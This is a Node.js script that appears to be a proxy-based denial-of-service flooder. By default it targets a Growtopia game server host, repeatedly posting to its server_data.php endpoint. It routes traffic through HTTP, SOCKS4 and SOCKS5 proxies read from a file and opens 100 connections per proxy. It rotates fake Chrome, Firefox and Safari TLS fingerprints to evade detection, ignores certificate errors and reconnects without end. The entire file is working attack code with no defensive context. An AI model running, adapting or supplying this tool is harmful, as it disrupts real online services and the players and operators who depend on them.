const fs = require('fs');
const net = require('net');
const tls = require('tls');  


const args = process.argv.slice(2);
const TARGET_HOST = args[0] || "www.growtopia1.com";  
const TARGET_PORT = args[1] || "443";
const PROXY_FILE = args[2] || "live_proxies.txt";
const CONCURRENT = parseInt(args[3]) || 100;
const DURATION = parseInt(args[4]) || 0;


const PROFILES = [
    // --- Chrome Windows 124 ---
    {
        type: 'chrome',
        name: 'Chrome-Win',
        baseUA: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$VERSION Safari/537.36',
        platform: '"Windows"',
        brand: '"Google Chrome";v="$VERSION", "Chromium";v="$VERSION", "Not?A_Brand";v="24"',
        accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        acceptLang: ['en-US,en;q=0.9,id;q=0.8', 'id-ID,id;q=0.9,en;q=0.8', 'en-GB,en;q=0.9,id;q=0.7'],
        acceptEnc: ['gzip, deflate, br, zstd', 'gzip, deflate, br'],
        cacheControl: ['max-age=0', 'no-cache'],
        priority: 'u=0, i',
        versions: ['124.0.6367.91', '124.0.6367.78'],
        ciphers: [
            'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384',
            'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305'
        ],
        ecdhCurve: ['X25519:prime256v1:secp384r1', 'X25519:prime256v1'],
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3'
    },
    // --- Chrome macOS 120 ---
    {
        type: 'chrome',
        name: 'Chrome-Mac',
        baseUA: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$VERSION Safari/537.36',
        platform: '"macOS"',
        brand: '"Google Chrome";v="$VERSION", "Chromium";v="$VERSION", "Not?A_Brand";v="24"',
        accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        acceptLang: ['en-US,en;q=0.9', 'en-US,en;q=0.9,id;q=0.8'],
        acceptEnc: ['gzip, deflate, br'],
        cacheControl: ['max-age=0'],
        priority: 'u=0, i',
        versions: ['124.0.6367.91', '123.0.6312.86'],
        ciphers: [
            'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384'
        ],
        ecdhCurve: ['X25519:prime256v1:secp384r1'],
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3'
    },
    // --- Firefox Windows 125 ---
    {
        type: 'firefox',
        name: 'Firefox-Win',
        baseUA: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:$VERSION) Gecko/20100101 Firefox/$VERSION',
        platform: '',
        brand: '',
        accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        acceptLang: ['en-US,en;q=0.5', 'id,en-US;q=0.7,en;q=0.3'],
        acceptEnc: ['gzip, deflate, br', 'gzip, deflate'],
        cacheControl: ['no-cache'],
        priority: '',
        versions: ['125.0', '124.0.2'],
        ciphers: [
            'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384'
        ],
        ecdhCurve: ['X25519:prime256v1'],
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3'
    },
    // --- Safari macOS 17.4 ---
    {
        type: 'safari',
        name: 'Safari-Mac',
        baseUA: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/$VERSION Safari/605.1.15',
        platform: '',
        brand: '',
        accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        acceptLang: ['en-US,en;q=0.9', 'en'],
        acceptEnc: ['gzip, deflate, br'],
        cacheControl: ['max-age=0'],
        priority: '',
        versions: ['17.4', '17.3'],
        ciphers: [
            'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305'
        ],
        ecdhCurve: ['X25519:prime256v1:secp384r1'],
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3'
    }
];

function randomFromArray(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}


function buildRequest(host) {
    const body = "version=5.47&platform=0&protocol=225";
    const contentLength = Buffer.byteLength(body); // 36

    return `POST /growtopia/server_data.php HTTP/1.1\r\n` +
           `Host: ${host}\r\n` +
           `User-Agent: UbiServices_SDK_2022.Release.9_PC64_ansi_static\r\n` +
           `Accept: */*\r\n` +
           `Content-Type: application/x-www-form-urlencoded\r\n` +
           `Content-Length: ${contentLength}\r\n` +
           `Connection: keep-alive\r\n` +
           `\r\n` +
           body;
}

function sendPayload(socket, targetHost) {
    if (socket.destroyed) return;
    socket.write(buildRequest(targetHost));
}

function setupTLS(socket, targetHost) {
    const prof = randomFromArray(PROFILES);
    const ciphers = randomFromArray(prof.ciphers);
    const ecdhCurve = randomFromArray(prof.ecdhCurve);

    const tlsOptions = {
        socket: socket,
        host: targetHost,
        servername: targetHost,
        rejectUnauthorized: false,
        ciphers: ciphers,
        ecdhCurve: ecdhCurve,
        minVersion: prof.minVersion,
        maxVersion: prof.maxVersion,
        ALPNProtocols: ['http/1.1']
    };

    const tlsSocket = tls.connect(tlsOptions, () => {
        sendPayload(tlsSocket, targetHost);
    });

   
    tlsSocket.on('data', () => {
        sendPayload(tlsSocket, targetHost);
    });

    tlsSocket.on('error', () => {});

    return tlsSocket;
}

function sendHTTPProxy(proxyIp, proxyPort, onConnected, onFailed) {
    const proxySocket = net.connect(proxyPort, proxyIp, () => {
        proxySocket.setNoDelay(true);
        proxySocket.setKeepAlive(true, 1000);
        proxySocket.write(
            `CONNECT ${TARGET_HOST}:${TARGET_PORT} HTTP/1.1\r\n` +
            `Host: ${TARGET_HOST}:${TARGET_PORT}\r\n` +
            `Proxy-Connection: keep-alive\r\n\r\n`
        );
    });

    proxySocket.once('data', (chunk) => {
        if (chunk.toString().indexOf('200') !== -1) {
            const tlsSocket = setupTLS(proxySocket, TARGET_HOST);
            onConnected(tlsSocket);
        } else {
            proxySocket.destroy();
            onFailed();
        }
    });

    proxySocket.on('error', () => {
        proxySocket.destroy();
        onFailed();
    });
}

function sendSocks4(proxyIp, proxyPort, onConnected, onFailed) {
    const socket = net.connect(proxyPort, proxyIp, () => {
        socket.setNoDelay(true);
        socket.setKeepAlive(true, 1000);

        const handshake = Buffer.alloc(9);
        handshake[0] = 0x04;
        handshake[1] = 0x01;
        handshake[2] = (TARGET_PORT >> 8) & 0xFF;
        handshake[3] = TARGET_PORT & 0xFF;
        const ipParts = TARGET_HOST.split('.').map(p => parseInt(p));
        handshake[4] = ipParts[0];
        handshake[5] = ipParts[1];
        handshake[6] = ipParts[2];
        handshake[7] = ipParts[3];
        handshake[8] = 0x00;
        socket.write(handshake);
    });

    socket.once('data', (data) => {
        if (data[1] === 0x5A) {
            const tlsSocket = setupTLS(socket, TARGET_HOST);
            onConnected(tlsSocket);
        } else {
            socket.destroy();
            onFailed();
        }
    });

    socket.on('error', () => {
        socket.destroy();
        onFailed();
    });
}

function sendSocks5(proxyIp, proxyPort, onConnected, onFailed) {
    const socket = net.connect(proxyPort, proxyIp, () => {
        socket.setNoDelay(true);
        socket.setKeepAlive(true, 1000);
        socket.write(Buffer.from([0x05, 0x01, 0x00]));
    });

    socket.once('data', (data) => {
        if (data[0] === 0x05 && data[1] === 0x00) {
            const hostBuffer = Buffer.from(TARGET_HOST);
            const request = Buffer.alloc(7 + hostBuffer.length);
            request[0] = 0x05;
            request[1] = 0x01;
            request[2] = 0x00;
            request[3] = 0x03;
            request[4] = hostBuffer.length;
            hostBuffer.copy(request, 5);
            request[5 + hostBuffer.length] = (TARGET_PORT >> 8) & 0xFF;
            request[6 + hostBuffer.length] = TARGET_PORT & 0xFF;
            socket.write(request);

            socket.once('data', (response) => {
                if (response[1] === 0x00) {
                    const tlsSocket = setupTLS(socket, TARGET_HOST);
                    onConnected(tlsSocket);
                } else {
                    socket.destroy();
                    onFailed();
                }
            });
        } else {
            socket.destroy();
            onFailed();
        }
    });

    socket.on('error', () => {
        socket.destroy();
        onFailed();
    });
}

function startStableConnection(protocol, proxyIp, proxyPort) {
    const RECONNECT_DELAY = 2000;

    function tryConnect() {
        const connectFn = protocol === "http" ? sendHTTPProxy :
            protocol === "socks4" ? sendSocks4 :
                protocol === "socks5" ? sendSocks5 : null;

        if (!connectFn) return;

        connectFn(proxyIp, proxyPort, (tlsSocket) => {
            tlsSocket.on('close', () => {
                setTimeout(tryConnect, RECONNECT_DELAY);
            });
            tlsSocket.on('error', () => {});
        }, () => {
            setTimeout(tryConnect, RECONNECT_DELAY);
        });
    }

    tryConnect();
}

function main() {
    let data = fs.readFileSync(PROXY_FILE, 'utf8');
    let lines = data.split(/\r?\n/);

    // Kumpulkan semua proxy valid
    const proxyList = [];
    for (let i = 0; i < lines.length; i++) {
        if (!lines[i]) continue;
        let [protocol, rest] = lines[i].split('://');
        if (!rest) continue;
        let [ip, port] = rest.split(':');
        if (!ip || !port) continue;
        proxyList.push({ protocol, ip, port });
    }

    if (proxyList.length === 0) {
        console.log("[ERROR] No valid proxies found.");
        process.exit(1);
    }

    if (DURATION > 0) {
        console.log(`[INFO] Running for ${DURATION} seconds...`);
        setTimeout(() => {
            console.log(`\n[INFO] Time's up! Exiting...`);
            process.exit(0);
        }, DURATION * 1000);
    }

    const totalConnections = proxyList.length * CONCURRENT;
    console.log(`[INFO] Starting ${totalConnections} connections (${CONCURRENT} per proxy) ..`);

    for (let i = 0; i < totalConnections; i++) {
        const randomProxy = proxyList[Math.floor(Math.random() * proxyList.length)];
        startStableConnection(randomProxy.protocol, randomProxy.ip, randomProxy.port);
    }
}

process.setMaxListeners(0);
main();
